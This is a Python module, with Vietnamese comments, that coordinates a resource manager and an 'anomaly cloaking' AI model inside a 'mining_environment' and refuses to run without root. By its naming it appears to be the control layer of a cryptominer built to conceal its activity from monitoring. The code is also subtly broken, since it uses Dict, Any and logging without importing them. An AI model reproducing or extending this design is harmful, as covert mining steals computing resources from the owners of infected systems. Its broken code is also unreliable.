# system_manager.py

import os
import sys
import json
from pathlib import Path
from time import sleep

from resource_manager import ResourceManager, AnomalyDetector
from logging_config import setup_logging

# Định nghĩa các đường dẫn cấu hình
CONFIG_DIR = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config'))
MODELS_DIR = Path(os.getenv('MODELS_DIR', '/app/mining_environment/models'))
LOGS_DIR = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs'))

# Đường dẫn tới các mô hình AI
RESOURCE_OPTIMIZATION_MODEL_PATH = MODELS_DIR / "resource_optimization_model.pt"
ANOMALY_CLOAKING_MODEL_PATH = MODELS_DIR / "anomaly_cloaking_model.pt"

# Thiết lập logger cho SystemManager
system_logger = setup_logging('system_manager', LOGS_DIR / 'system_manager.log', 'INFO')


class SystemManager:
    """
    Lớp kết hợp cả ResourceManager và AnomalyDetector, đảm bảo rằng hai lớp này hoạt động đồng bộ và không gây xung đột khi truy cập các tài nguyên chung.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.resource_manager = ResourceManager(config, RESOURCE_OPTIMIZATION_MODEL_PATH, logger)
        self.anomaly_detector = AnomalyDetector(config, ANOMALY_CLOAKING_MODEL_PATH, logger)

    def start(self):
        system_logger.info("Đang khởi động SystemManager...")
        self.resource_manager.start()
        self.anomaly_detector.start()
        system_logger.info("SystemManager đã được khởi động thành công.")

    def stop(self):
        system_logger.info("Đang dừng SystemManager...")
        self.resource_manager.stop()
        self.anomaly_detector.stop()
        system_logger.info("Đã dừng SystemManager thành công.")


def load_config(config_path: Path) -> Dict[str, Any]:
    """
    Hàm tải cấu hình từ tệp JSON.

    Args:
        config_path (Path): Đường dẫn tới tệp cấu hình.

    Returns:
        Dict[str, Any]: Cấu hình được tải.
    """
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        system_logger.info(f"Đã tải cấu hình từ {config_path}")
        # Thêm các bước kiểm tra cấu hình nếu cần
        return config
    except FileNotFoundError:
        system_logger.error(f"Tệp cấu hình không tồn tại: {config_path}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        system_logger.error(f"Lỗi cú pháp JSON trong tệp {config_path}: {e}")
        sys.exit(1)


def start():
    # Tải cấu hình
    config_path = CONFIG_DIR / "resource_config.json"
    config = load_config(config_path)

    # Kiểm tra xem các mô hình AI có tồn tại không
    if not RESOURCE_OPTIMIZATION_MODEL_PATH.exists():
        system_logger.error(f"Mô hình AI không tồn tại tại: {RESOURCE_OPTIMIZATION_MODEL_PATH}")
        sys.exit(1)
    if not ANOMALY_CLOAKING_MODEL_PATH.exists():
        system_logger.error(f"Mô hình AI không tồn tại tại: {ANOMALY_CLOAKING_MODEL_PATH}")
        sys.exit(1)

    # Khởi tạo SystemManager với cấu hình và logger
    system_manager = SystemManager(config, system_logger)
    system_manager.start()

    # Giữ cho thread SystemManager chạy liên tục
    try:
        while True:
            sleep(1)
    except KeyboardInterrupt:
        system_logger.info("Nhận tín hiệu dừng từ người dùng. Đang dừng SystemManager...")
        system_manager.stop()
    except Exception as e:
        system_logger.error(f"Lỗi khi chạy SystemManager: {e}")
        system_manager.stop()
        sys.exit(1)


if __name__ == "__main__":
    # Đảm bảo script chạy với quyền root
    if os.geteuid() != 0:
        print("Script phải được chạy với quyền root.")
        sys.exit(1)

    start()
